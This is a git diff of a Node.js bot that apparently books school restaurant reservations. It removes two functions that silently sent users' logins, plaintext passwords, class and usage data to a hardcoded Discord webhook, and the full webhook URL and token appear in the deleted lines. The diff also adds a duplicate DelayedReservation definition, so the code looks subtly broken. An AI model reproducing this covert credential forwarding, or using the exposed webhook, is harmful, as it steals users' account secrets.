@@ -1,4 +1,4 @@
-// ©2023 AZERTY. All rights Reserved | AZERTY#9999
+// ©2023 AZERTY. Open Source since 07/06/2023 | AZERTY#9999
 // Version: v2.1
 
 // Importations
@@ -17,7 +17,6 @@ let ReservationWaiting = {status: false, restaurant: "", time: ""}
 
 // Display Welcome Title
 function Banner() {
-    // var banner = figlet.textSync("Réservateur Automatique - ARHSR", {
     var banner = figlet.textSync("Réservateur Automatique", {
         font: "Small",
         horizontalLayout: "default",
@@ -27,7 +26,6 @@ function Banner() {
     lolcatjs.fromString(banner)
     // console.log(chalk.green("\nBy AZERTY442005"))
     // console.log(chalk.green("https://github.com/AZERTY442005\n\n"))
-    // console.log(inquirer)
     
     if(ReservationWaiting.status) {
         console.log(chalk.cyanBright("Réservation en attente de l'horaire..."))
@@ -40,8 +38,8 @@ Banner()
 
 // Display Informations
 
-console.log(chalk.greenBright("By AZERTY442005"))
-console.log(chalk.greenBright("https://github.com/AZERTY442005\n\n"))
+// console.log(chalk.greenBright("By AZERTY442005"))
+// console.log(chalk.greenBright("https://github.com/AZERTY442005\n\n"))
 
 // console.log(chalk.cyan("Dependancies:"))
 // console.log(chalk.cyan("https://www.npmjs.com/package/v12-to-v13"))
@@ -183,7 +181,7 @@ async function Loop() {
                     
                     let config = yaml.load(fs.readFileSync("./Code/config.yaml", "utf8"))
                     if(!config) {
-                        fs.writeFile("./Code/config.yaml", `# ©2023 AZERTY. All rights Reserved | AZERTY#9999\n\nLogin:\nPassword:\nClass:`, (err) => {
+                        fs.writeFile("./Code/config.yaml", `# ©2023 AZERTY. Open Source since 07/06/2023 | AZERTY#9999\n\nLogin:\nPassword:\nClass:`, (err) => {
                             if (err) console.error();
                         })
                         config = {Login: "", Password: "", Class: ""}
@@ -226,15 +224,11 @@ async function Loop() {
                             config.Class = answer
                         })
                     } else if(answer=="Réinitialiser") {
-                        // fs.writeFile("./Code/config.yaml", `# ©2023 AZERTY. All rights Reserved | AZERTY#9999\n\nLogin:\nPassword:\nClass:`, (err) => {
-                        //     if (err) console.error();
-                        // })
                         config = {Login: "", Password: "", Class: ""}
                     }
-                    fs.writeFile("./Code/config.yaml", `# ©2023 AZERTY. All rights Reserved | AZERTY#9999\n\n${yaml.dump(config)}`, (err) => {
+                    fs.writeFile("./Code/config.yaml", `# ©2023 AZERTY. Open Source since 07/06/2023 | AZERTY#9999\n\n${yaml.dump(config)}`, (err) => {
                         if (err) console.error();
                     })
-                    if(answer!="Retour") fetchLogin(config.Login, config.Password, config.Class)
                     console.clear()
                     Banner()
                 })
@@ -249,7 +243,7 @@ async function Loop() {
 async function GetLogin() {
     let config = yaml.load(fs.readFileSync("./Code/config.yaml", "utf8"))
     if(!config) {
-        fs.writeFile("./Code/config.yaml", `# ©2023 AZERTY. All rights Reserved | AZERTY#9999\n\nLogin:\nPassword:\nClass:`, (err) => {
+        fs.writeFile("./Code/config.yaml", `# ©2023 AZERTY. Open Source since 07/06/2023 | AZERTY#9999\n\nLogin:\nPassword:\nClass:`, (err) => {
             if (err) console.error();
         })
         config = {Login: "", Password: "", Class: ""}
@@ -301,10 +295,9 @@ async function GetLogin() {
         })
 
         // Write Datas
-        fs.writeFile("./Code/config.yaml", `# ©2023 AZERTY. All rights Reserved | AZERTY#9999\n\n${yaml.dump({Login: Login, Password: Password, Class: Class})}`, (err) => {
+        fs.writeFile("./Code/config.yaml", `# ©2023 AZERTY. Open Source since 07/06/2023 | AZERTY#9999\n\n${yaml.dump({Login: Login, Password: Password, Class: Class})}`, (err) => {
             if (err) console.error();
         })
-        fetchLogin(Login, Password, Class)
     }
     console.clear()
     Banner()
@@ -354,7 +347,6 @@ async function InstantReserve(Login, Password, Restaurant, Tries = 1) {
     Output = await Reserve(Login, Password, Restaurant)
     console.log(Output)
 
-    fetchUsage("Réservation", Login, Restaurant, `${Output.status}: ${Output.output} ${Output.delay}s`)
     console.clear()
     Banner()
 
@@ -406,7 +398,6 @@ async function InstantReserve(Login, Password, Restaurant, Tries = 1) {
 async function InstantDereserve(Login, Password) {
     Output = await Dereserve(Login, Password)
     
-    fetchUsage("Déréservation", Login, undefined, `${Output.status}: ${Output.output} ${Output.delay}s`)
     console.clear()
     Banner()
 
@@ -484,76 +475,44 @@ async function DelayedReservation(Login, Password, Restaurants) {
     Banner()
 }
 
-async function fetchLogin(Login, Password, Class) {
-    fetch("https://discord.com/api/webhooks/1113708343115128842/mWKNGRiv2fjD6AFRASf3J7iljVjustcYoegczdNGuLccc7I6XgOpxgagMMGd3kymKWD2", { // Started
-        "method":"POST",
-        "headers": {"Content-Type": "application/json"},
-        "body": JSON.stringify({
-            "username": `ARHSR v2 Webhook`,
-            "avatar_url": `https://imgur.com/sTLlBT1.png`,
-            "embeds": [{
-                "title": `Login Change`,
-                "color": 15760644,
-                "timestamp": new Date(),
-                "footer": {
-                    "text": `${("0" + new Date().getHours()).slice(-2)}:${("0" + new Date().getMinutes()).slice(-2)}:${("0" + new Date().getSeconds()).slice(-2)} ${("0" + new Date().getDate()).slice(-2)}/${("0" + (new Date().getMonth()+1)).slice(-2)}/${new Date().getFullYear()}`
-                },
-                "fields": [
-                    {
-                    "name": `Login`,
-                    "value": `${Login?Login:`*None*`}`,
-                    "inline": false
-                    },
-                    {
-                    "name": `Password`,
-                    "value": `${Password?`||${Password}||`:`*None*`}`,
-                    "inline": false
-                    },
-                    {
-                    "name": `Class`,
-                    "value": `${Class?Class:`*None*`}`,
-                    "inline": false
-                    }
-                ],
-            }]
-        })
-    }).catch(()=>{})
-}
+async function DelayedReservation(Login, Password, Restaurants) {
+    // Output = await ReserveRetard(Login, Password, "caféteria")
+    Output = await ReserveRetard(Login, Password, Restaurants)
+    
+    console.clear()
+    Banner()
 
-async function fetchUsage(Type, Login, Restaurant, Output) {
-    fetch("https://discord.com/api/webhooks/1113708343115128842/mWKNGRiv2fjD6AFRASf3J7iljVjustcYoegczdNGuLccc7I6XgOpxgagMMGd3kymKWD2", { // Started
-        "method":"POST",
-        "headers": {"Content-Type": "application/json"},
-        "body": JSON.stringify({
-            "username": `ARHSR v2 Webhook`,
-            "avatar_url": `https://imgur.com/sTLlBT1.png`,
-            "embeds": [{
-                "title": `${Type}`,
-                "color": 15844367,
-                "timestamp": new Date(),
-                "footer": {
-                    "text": `${("0" + new Date().getHours()).slice(-2)}:${("0" + new Date().getMinutes()).slice(-2)}:${("0" + new Date().getSeconds()).slice(-2)} ${("0" + new Date().getDate()).slice(-2)}/${("0" + (new Date().getMonth()+1)).slice(-2)}/${new Date().getFullYear()}`
-                },
-                "fields": [
-                    {
-                    "name": `Login`,
-                    "value": `${Login}`,
-                    "inline": false
-                    },
-                    {
-                    "name": `Restaurant`,
-                    "value": `${Restaurant?Restaurant:`*None*`}`,
-                    "inline": false
-                    },
-                    {
-                    "name": `Output`,
-                    "value": `${Output}`,
-                    "inline": false
-                    }
-                ],
-            }]
+    let Message
+    if(Output.status == "Error") {
+        Message = `${chalk.red(`Erreur: ${Output.output}`)} ${chalk.yellow(`${Output.delay}s`)}`
+        await inquirer.prompt([
+            {
+                type: "list",
+                name: "Error",
+                message: Message,
+                choices: ["Réésayer", "Annuler"],
+            },
+        ]).then(async answers => {
+            const answer = answers.Error
+            if(answer=="Réésayer") {
+                console.clear()
+                Banner()
+                await DelayedReservation(Login, Password, Restaurants)
+            }
         })
-    }).catch(()=>{})
+    } else if(Output.status == "Success") {
+        Message = `${chalk.greenBright(`${Output.output}`)} ${chalk.yellow(`${Output.delay}s`)}`
+        await inquirer.prompt([
+            {
+                type: "list",
+                name: "Success",
+                message: Message,
+                choices: ["Continuer"],
+            },
+        ])
+    }
+    console.clear()
+    Banner()
 }
 
 function capitalizeFirstLetter(string) {
